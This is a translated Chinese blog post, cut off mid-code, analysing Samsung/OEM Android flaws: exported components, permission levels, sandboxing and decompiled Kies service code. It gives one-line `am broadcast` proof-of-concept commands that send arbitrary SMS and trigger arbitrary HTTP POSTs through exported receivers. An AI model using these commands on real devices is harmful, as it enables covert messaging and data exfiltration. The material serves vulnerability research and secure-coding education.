
# [翻译] 一些 OEM 厂商的漏洞分析

`6c1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2U0M7$3c8F1i4K6u0W2L8X3g2@1i4K6u0r3N6e0l9I4x3e0l9$3z5e0R3I4x3#2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3z5e0t1H3z5e0t1J5x3b7`.`

现在给予 Android 平台生态系统服务的终端厂商越来越大，暴露的漏洞也越来越多了。

公司越大，漏洞越多，原因也是定制的更多了。尤其是三星哈！

`95cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9K6b7g2)9J5c8Y4N6%4N6#2)9J5k6i4q4#2j5i4u0C8M7$3I4S2j5W2)9J5k6h3y4G2L8g2)9J5c8X3c8D9i4K6u0r3b7h3&6V1M7X3!0A6k6q4)9J5k6p5!0q4e0g2)9J5k6r3q4H3M7r3I4A6j5$3q4@1K9h3!0F1M7#2)9J5k6r3W2F1M7$3g2U0N6i4u0A6N6s2W2Q4x3X3c8S2L8X3c8Q4x3X3c8T1j5h3y4C8k6r3!0G2M7Y4y4Q4x3X3c8%4K9i4c8Z5L8%4g2@1i4K6u0V1M7r3g2J5L8h3W2`.`

## 简单分析

### 1. 组件安全性

By default, components are not exported。缺省组件是没有导出的，也就是说其它程序无法直接调用。

Special case: `ContentProvider`：最新的 4.2.2 也缺省是未导出的，原来的版本是导出的，有安全隐患。

The component status, exported or not, is defined by `AndroidManifest.xml`。

The attribute `exported=[true|false]`：组件的导出与否，在`AndroidManifest.xml`里面定义。程序猿要注意。

```xml
<?xml version="1.0" encoding="utf-8"?>

2 <manifest android:sharedUserId="android.uid.system" android:versionCode="2"

3 android:versionName="2.0.0" package="com.sec.android.app.kieswifi">

4 <uses-permission android:name="android.permission.ACCESS_PHONE_STATE"/>

5 <uses-permission android:name="android.permission.INTERNET" />

6 <application>

7 <receiver android:name="AutoConnReceiver"

8 android:permission="android.permission.KIES_WIFI">

9 <intent-filter>

10 <action android:name="android.net.wifi.RUN_KIES" />

11 </intent-filter>

12 </receiver>

13 <service android:name=".AutoConnService"></service>

14 <activity android:name=".ui.KiesLauncher">

15 <intent-filter android:icon="@7F02001D">

16 <action android:name="android.intent.action.MAIN" />

17 <category android:name="android.intent.category.DEFAULT" />

18 </intent-filter>

19 </activity>

20 </application>

21 <uses-sdk android:minSdkVersion="14" android:targetSdkVersion="14" />

22 </manifest>
```

Presence of an intent-filter (the component is automatically exported)，如果涉及了`filter`，那肯定是导出的！没看懂的说明不是 Android 码农。

A component can be exported but protected by a permission，既然注定要导出，那也得安全导出，那就给导出的组件设置一个权限吧！！注意，设置`signature`权限。

否则就是摆设。

以下内容摘自老王的书籍：

一个权限主要包含三个方面的信息：权限的名称、属于的权限组、保护级别。

#### 1. `protectionLevel`

它表示系统向一个请求权限的应用程序授予（或不授予）给定的权限时应该遵循的方法。

- `Normal`权限，只要申请了就可以使用，不会给用户带来伤害。比如`SET_WALLPAPER`、`android.permission.VIBRATE`、`com.android.alarm.permission.SET_ALARM`。
- `Dangerous`权限，可能会给用户带来潜在性的伤害，如读取电话簿、联网等，系统在安装应用时提示用户，需要用户确认才可以使用。比如`android.permission.SEND_SMS`、`android.permission.CALL_PHONE`。
- `signature`权限，具有同一签名的应用才能访问。当请求某个权限的应用与已经申请了这个权限的应用具有相同的证书签名，系统就会授予其相应的权限。比如`android.permission.FORCE_STOP_PACKAGES`、`android.permission.INJECT_EVENTS`。事实上这是需要系统签名。
- `signatureOrSystem`权限，主要被设备商使用，不推荐使用。Actually, the requested permission is granted only to applications that are in the Android system image or are signed with the same certificates as those in the system image。比如`android.permission.ACCESS_USB`、`android.permission.SET_TIME`。

## 2. Android 基本安全机制

下列内容摘自老王的书籍：

沙箱机制：隔离文件系统、隔离进程空间。

每一个 Android 应用都运行在一个 `Dalvik` 虚拟机实例里，而每一个虚拟机实例都是一个独立的进程空间。不同的应用在不同的进程空间里运行，可以最大程度地保护应用的安全和独立运行。每一个 Android 应用程序（`.apk`文件）会在安装时分配一个独有的 Linux 用户 ID，这就为它建立了一个沙盒，使其不能与其他应用程序进行接触。这个用户 ID 会在安装时分配给它，并在该设备上一直保持同一个数值。`UID` 在 Linux 中就是用户的 ID，表明是哪个用户运行了这个程序，主要用于权限的管理。

除了 `UID`，进程还有 `PID`（Process Identifier），`PID` 就是进程的身份标识，程序一运行系统就会自动分配给进程一个独一无二的 `PID`。进程中止后 `PID` 被系统回收，可能会被继续分配给新运行的程序，但是在 Android 系统中一般不会把已经 kill 掉的进程 ID 重新分配给新的进程，新产生进程的进程号，一般比产生之前所有的进程号都要大。

虽然不同应用不同 `UID`，无法共享信息，也多有不便啊，于是可以通过使用`AndroidManifest.xml`文件中的`manifest`标签中的`sharedUserId`属性，来使不同的`package`共用同一个用户 ID。通过这种方式，这两个`package`就会被认为是同一个应用程序，拥有同一个用户 ID，并且拥有同样的文件存取权限。注意：为了保持安全，只有当两个应用程序被同一个签名签署的时候（并且请求了同一个`sharedUserId`）才会被分配同样的用户 ID。

## 3. 权限管理机制

Android 的系统资源都被一些关系户提前拿到了。普通应用要想使用，那就得申请批文。

这种机制，不光被系统应用采用用来保护系统资源，还可以扩展到任何应用。程序猿也可以自定义权限，防止其他屌丝来袭，咱只给女神留接口。

系统受保护的资源很多，比如 SD card write access、`INTERNET` access、sending SMS，等等。

程序猿都可以在`AndroidManifest.xml`中申请，然后安装时会提示，有用户决策！

A permission can protect：（permission可以用到任何你需要保护资源的场景）

- Functions：`AccountManager.getAccounts()`（`GET_ACCOUNTS`）
- Intents：`android.intent.action.CALL`（`CALL_PHONE`）
- Components：`content://contacts`（`READ_CONTACTS`，...）

A permission is given to an `UID` and not to a `packagename`。另外 permission 是授权给 `UID` 的。。。。

Permission model is applied on native code too，native code 也难逃权限沙箱！

All permissions of each application with the same `sharedUserId` are combined。几个应用，如果 `UID` 相同，那么他们的权限就是 ALL Together。

## 4. 系统目录

- `/system/app`
- `/system/framework`
- `/system/bin`
- `/system/lib`

这些都是系统应用、native 应用、库的位置，都很关键的！

比如`/system/app`，S3 里面就有 216 个 APK。多么诱人的挖掘漏洞机会啊！有奖励计划吗？

如何自动挖漏洞，这篇文章说了几个。

### 基于 Androguard

Based on `Androguard`（great framework）。

### `ASAManifest`

Analyzes the manifest of an application and tells which components are exported and under what conditions。主要是分析 `manifest` 的，看是不是有组件导出！

申请了多少权限，是不是可被 debug？

### `ASADatabase`

Analyzes a large amount of applications like `ASAManifest` does and checks for sensitive API usage. The results are stored in `MongoDB` database。

主要是权限分析，看都申请了哪些权限，比如申请了`permission:/INSTALL_PACKAGES`，这是要闹啥！！！！这是你该申请的吗？

这是系统权限啊，需要 system 签名的，`manifest.sharedUserId":"android.uid.system"`。。。这要坑爹啊！

### `ASADi`

`ASADi`（ongoing）：Di between two versions of a system, by example to detect vulnerability patching。找不同的游戏，发现不同版本的差异！

上述带了作者的一些看法吧，看来作者不擅长挖漏洞！！总之，我已经有了自动化工具了哈！！！！

## 5. 悄悄地干活！

先分析一下系统都有哪些资源：

### 1. SD 卡资源

有这个权限 `WRITE_EXTERNAL_STORAGE` 就可以任意读写了。

SD 卡由于是 FAT 文件系统，所以没有 Linux 的 DAC 权限机制，没有沙箱！

所以数据和程序放在这儿一定要注意，比如通过`DexClassLoader`加载的……

安装到 SD 卡中的应用（比如你部署到 SD 卡中），系统会加密这部分信息！

如果一个应用申请了（`INTERNET` + `SD card`），那他就是想给你的 SD 卡找个好买家！

### 2. SMS

SMS 老版本有悄悄发短信的接口，但由于权限过于敏感，容易被杀毒软件检测。

新版本的 SMS 直接发短信，系统会有提示！很大的进步！

现在才到本文的正题……系统漏洞！！！！

`exported BroadcastReceiver -> ui.MmsBGSender`：An well formatted Intent allows to send arbitrary SMS/MMS。

OEM 的程序猿导出一个任意发短信的接口了……`exported=true`，如何解决，`exported=false`。

一个 POC：

```bash
shell@android:/ $ am broadcast -a com.android.mms.QUICKSND --es mms_to "*PHONENUMBER*"

--es mms_subject "*SUBJECT*" --es mms_text "*MESSAGE*"
```

`am` 不熟悉的谈不上是 Android 程序猿！

### 3. 奇葩的 INTERNET 权限

现在是个应用都申请 `INTERNET` 权限吧，要不让你怎么敢号称是移动互联网应用呢？

这个奇葩漏洞就是无需申请 `INTERNET` 权限，照样送外卖！

When an Intent is received with `com.sec.pcw.device.HTTP_REQUEST_RETRY` as action。

The `body`、`uri` and `pushType` attributed are extracted and an HTTP POST request is executed based on it。

POC：

```bash
shell@android:/ $ am broadcast -a com.sec.pcw.device.HTTP_REQUEST_RETRY --es uri

*URL* --es body *POST_DATA* --es pushType *PUSHTYPE*
```

让老王书里介绍的种种的权限代理攻击都羞愧不如！

### 4. 同步工具漏洞

这个漏洞让我想起以前的豌豆荚等同步工具的漏洞。

开启了一个服务，然后呢，又导出了接口……这个服务呢又关联很多敏感信息……

The application exports a `BroadcastReceiver` `smlNpsReceiver`。Answers to Intent related to Kies：

- `com.intent.action.KIES_WSSERVICE_START`
- `com.intent.action.KIES_WSSERVICE_START_WIFI`

一个导出的 `BroadcastReceiver`：`smlNpsReceiver`

```java
public void onReceive(Context paramContext, Intent paramIntent)

2 {

3 [...]

4 if(paramIntent.getAction().

5 equals("com.intent.action.KIES_WSSERVICE_START"))

6 {

7 smlDebug.SML_DEBUG(2, "KIES_WSSERVICE_START");

8 wifi_connected = false;

9 usb_connected = true;

10 paramContext.stopService(

11 new Intent(paramContext, smlNpsService.class)

12 );

13 paramContext.startService(

14 new Intent(paramContext, smlNpsService.class)

15 );

16 }

17 [...]

18 }
```

开启的服务 `smlNpsService.class`：

- When it starts, it runs `NpsServiceTask` in a thread。
- Listens on `0.0.0.0:1108`（TCP）。
- Each connection is handled by `smlNpsHandler` in a separated thread。
- The method `work()` is called to handle the received data。

`smlNpsHandler.work()`：

```java
1 protected void work()

2 {

3 if(this.socket != 0)

4 {

5 socketIS = this.socket.getInputStream();

6 socketOS = this.socket.getOutputStream();

7 cmdLine = this.readLine(socketIS);

8 if((cmdLine != 0) && (cmdLine.length() != 0))

9 {

10 cmdInformation = new String[3];

11 v5 = cmdLine.indexOf("BEGIN");

12 cmdInformation[0] = cmdLine.substring(0, 3);

13 if(v5 <= 3) {

14 cmdInformation[1] = cmdLine.substring(3, cmdLine.length());

15 } else {

16 cmdInformation[1] = cmdLine.substring(3, v5);
```
